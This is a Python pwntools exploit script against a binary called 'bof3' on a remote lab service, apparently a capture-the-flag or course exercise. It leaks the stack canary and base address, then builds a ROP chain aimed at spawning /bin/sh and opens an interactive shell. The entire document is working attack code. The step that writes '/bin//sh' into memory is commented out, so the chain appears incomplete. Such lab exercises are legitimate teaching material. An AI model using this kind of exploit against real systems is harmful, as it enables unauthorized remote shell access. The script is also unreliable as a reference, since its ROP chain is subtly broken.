#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
else:
    r = remote('up.zoolab.org', port)

# GET canary
payload = 'A'*41
r.recvuntil(b"name? ")
r.send(payload)
out = r.recvline().strip()

padding = b'A' * 41
split_position = out.find(padding) + len(padding)
out = b'\x00' + out[split_position:]  
out1 = out[0:8]  # Canary
out2 = out[8:]  # Return address

# Get base address
r.recvuntil(b"number? ")
payload = 'A' * 56
r.send(payload)
out = r.recvline().strip()
padding = b'A' * 56
split_position = out.find(padding) + len(padding)
out = out[split_position:]
out = out.ljust(8, b'\x00')
address = unpack(out, 'all', endian='little')
base_address = address - elf.symbols['main'] - 0x8a64

# Set BSS address for /bin/sh
bss_addr = elf.bss() + base_address
bin_sh = 0x68732f2f6e69622f  # '/bin//sh'

# Build ROP chain
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0] + base_address
pop_rax_rdx_rbx_ret = next(elf.search(asm('pop rax; pop rdx; pop rbx; ret'))) + base_address
pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])[0] + base_address
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0] + base_address
#mov_rdi_rsi = next(elf.search(asm('mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret'))) + base_address
syscall = next(elf.search(asm('syscall'))) + base_address

# Write /bin/sh to bss
rop.raw(pop_rdi_ret)
rop.raw(bss_addr)
rop.raw(pop_rsi_ret)
rop.raw(bin_sh)
#rop.raw(mov_rdi_rsi)

# Prepare for syscall
rop.raw(pop_rdi_ret)
rop.raw(bss_addr)
rop.raw(pop_rsi_ret)
rop.raw(0)
rop.raw(pop_rax_ret)
rop.raw(59)
rop.raw(syscall)


padding = b"A" * 40

payload = padding + out1 + b"A"*8 + rop.chain()
print(payload)

# Send payload
r.recvuntil(b"name? ")
r.sendline(payload)
r.recvuntil(b"message: ")
r.send(payload)
r.interactive()
